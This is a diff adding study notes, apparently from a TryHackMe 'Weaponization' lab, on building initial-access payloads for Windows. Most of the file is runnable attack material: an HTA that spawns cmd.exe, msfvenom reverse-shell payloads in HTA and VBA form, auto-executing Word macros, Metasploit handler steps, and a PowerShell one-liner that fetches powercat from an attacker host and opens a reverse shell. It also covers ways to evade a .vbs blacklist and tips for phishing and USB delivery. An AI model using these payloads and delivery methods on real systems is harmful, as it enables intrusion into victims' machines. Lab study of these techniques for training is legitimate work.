@@ -1,0 +1,193 @@
+Weaponization
+-Second stage after Recon
+-attacker generates and develops their own malicious code using deliverable payloads such as word documents, pdf etc
+-aims to gain inital access
+-use phishing campaigns, social engineering, browser or software exploitation, USB or web methods
+
+---------------------------------------------------------------------------------------------------------
+
+Deploy
+
+xfreerdp /v:[IP] /u:thm /p:TryHackM3 +clipboard
+
+---------------------------------------------------------------------------------------------------
+
+Windows Scripting Host (WSH)
+-built-in windows admin tool that runs batch files to automate and manage tasks
+-cscript.exe(command-line scripts) and wscript.exe(UI scripts): are responsible for executing Microsoft Visual Basic Scripts (VBScript)
+-VBScript: https://en.wikipedia.org/wiki/VBScript
+
+-open text document
+Dim message
+message = "Welcome to THM"
+MsgBox message
+-save as hello.vbs
+
+-command prompt
+hello.vbs
+-pop up message appears
+
+-if vbs files are blacklisted, it can be named a text file, and use following command
+wscript /e:VBScript C:\Users\thm\Desktop\payload.txt
+
+-----------------------------------------------------------------------------------------------------
+
+An HTML Application (HTA)
+
+-contain javascript and vbscript
+-LOLBINS (living-of-the-land binaries) tool mshta - used to execute HTA files
+
+code: 
+<html>
+<body>
+<script>
+	var c= 'cmd.exe'
+	new ActiveXObject('WScript.Shell').Run(c);
+</script>
+</body>
+</html>
+
+saved as payload.hta
+-start server on attackbox  
+python3 -m http.server 8090
+
+go to attack box Ip
+[AttackBoxIP]/payload.hta
+
+open and run the file it will execute cmd.exe
+
+-HTA Revese Connection
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=[AttackBoxIP] LPORT=[PORT] -f hta-psh -o payload.hta
+-listen using nc
+sudo nc -lvp [Port]
+-once the victim visits malicious URL and hits run - we get a connection
+
+Malicious HTA via Metasploit
+msfconsole -q
+-select exploit/windows/misc/hta_server
+-requires LHOST< LPORT, SRVHOST, Payload
+
+---------------------------------------------------------------------------------------------------------------
+
+Visual Basic for Application (VBA)
+-programming language by microsoft for ms applications such as word, excel, pp etc
+-VBA programming allows automating tasks 
+-Macros are MS Office applications that contain embedded code written in a programming language (VBA)
+-used to speed up custom functions by automating 
+-features: access APIs (Application Programming Interface)
+
+-start word document
+-View > Macros
+-enter name: [name], Macros in: [Document Name] > Create
+-VBS editor 
+
+Sub THM()
+  MsgBox ("Welcome to the world of Macros!")
+End Sub
+-run or F5
+
+-Execute VBA code automatically
+Sub Document_Open()
+  [macro name]
+End Sub
+
+Sub AutoOpen()
+  [macro name]
+End Sub
+
+Sub [macro name]()
+   MsgBox("Auto execution with Macros!")
+End Sub
+
+-needs to be saved as .doc or docm
+-97-2003 document
+
+-Open calc.exe
+Sub PoC()
+  Dim payload As String
+  payload = "calc.exe"
+  CreateObject("Wscript.Shell").Run payload,0
+End Sub
+
+-Dim payload as string - declare payload variable as string using 'Dim' keyword
+-set payload to "calc.exe"
+-CreateObject("Wscript.Shell").Run payload > create a windows scripting host (WSH) to run payload
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=[AttackBoxIP] LPORT=[PORT] -f vba
+-change WorkBook_Open() to Document_Open()
+-insert in word document macro
+
+msfconsole -q
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST [AttackBoxIP]
+set LPORT [PORT]
+exploit
+
+-document open in victim 
+-reverse tcp connection
+
+--------------------------------------------------------------------------------------------------
+
+PowerShell (PSH)
+-object-oriented programming language
+-useful in inital access, system enumerations and more
+
+Write-Output "Welcome to the Weaponization Room!" -save as: thm.ps1
+powershell -File thm.ps1
+
+-by default microsoft disables powershell scripts '.ps1' for security purposes
+Get-ExecutionPolicy
+Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
+A
+
+-Reverse Shell using powershell = powercat
+git clone https://github.com/besimorhino/powercat.git
+cd powercat
+python3 -m http.server 8080 - server of powercat 
+
+nc -lvp 1337 - listener
+
+-vicitim machine
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
+
+--------------------------------------------------------------------------------------------------------------------------------------
+
+Command And Control (C2)
+-Cobalt Strike
+-PowerShell Empire
+-Metasploit
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+Delivery Techniques
+-Email Delivery as phishing email with link or attachment
+-reputable email services
+-use a compromised email account
+
+Web Delivery
+-Clean TLS (Transport layer security certificate)
+-url shortner is helpful
+
+USB Delivery
+-events that distribute USB such as conferences
+-Rubber Ducky, USBHarpoon, Charging USB Cable O.MG cable
+
+--------------------------------------------------------------------------------------------------
+
+Practice Arena
+
+Malicious HTA via Metasploit
+msfconsole -q
+use exploit/windows/misc/hta
+-set LHOST, LPORT, SRVHOST, SRVPORT
+exploit
+nc -lvp <LPORT>
+-send url to machine
+
+
+
+
+
+ 
+ 
